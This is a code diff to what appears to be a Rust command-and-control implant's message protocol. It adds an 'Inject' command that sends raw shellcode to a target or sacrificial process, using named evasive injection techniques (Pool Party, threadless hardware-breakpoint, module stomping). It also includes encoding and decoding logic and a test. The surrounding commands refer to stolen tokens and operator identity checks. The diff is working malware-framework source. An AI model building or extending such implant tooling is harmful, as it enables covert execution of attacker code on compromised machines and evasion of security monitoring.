@@ -175,6 +175,16 @@ pub enum Command {
     /// Report the current thread identity. Output text = `DOMAIN\user` (+ a marker
     /// if a stolen/made token is held). Lets the operator confirm who executes.
     GetUid,
+    /// Inject shellcode into a target process. `method` selects the technique
+    /// (0 = Pool Party thread-pool / section-backed, 1 = threadless HWBP, 2 =
+    /// module stomp). `pid` is the target process (0 = spawn a sacrificial
+    /// process instead, using `spawn_to`). `shellcode` is the raw payload.
+    Inject {
+        method: u8,
+        pid: u32,
+        spawn_to: String,
+        shellcode: Vec<u8>,
+    },
 }
 
 /// 文件操作的种类（u8 tag 0-4）。
@@ -336,6 +346,13 @@ impl Command {
             }
             Command::Rev2Self => w.u8(24),
             Command::GetUid => w.u8(25),
+            Command::Inject { method, pid, spawn_to, shellcode } => {
+                w.u8(26);
+                w.u8(*method);
+                w.u32(*pid);
+                w.str(spawn_to);
+                w.blob(shellcode);
+            }
         }
     }
 
@@ -413,6 +430,13 @@ impl Command {
             },
             24 => Command::Rev2Self,
             25 => Command::GetUid,
+            26 => {
+                let method = r.u8()?;
+                let pid = r.u32()?;
+                let spawn_to = r.str()?;
+                let shellcode = r.blob()?.to_vec();
+                Command::Inject { method, pid, spawn_to, shellcode }
+            }
             t => return Err(WireError::BadTag(t)),
         })
     }
@@ -744,5 +768,19 @@ mod tests {
         assert_eq!(round_trip(mk_local.clone()), mk_local);
         assert_eq!(round_trip(Command::Rev2Self), Command::Rev2Self);
         assert_eq!(round_trip(Command::GetUid), Command::GetUid);
+        assert_eq!(
+            round_trip(Command::Inject {
+                method: 0,
+                pid: 1234,
+                spawn_to: "notepad.exe".into(),
+                shellcode: vec![0x90, 0xC3],
+            }),
+            Command::Inject {
+                method: 0,
+                pid: 1234,
+                spawn_to: "notepad.exe".into(),
+                shellcode: vec![0x90, 0xC3],
+            }
+        );
     }
 }
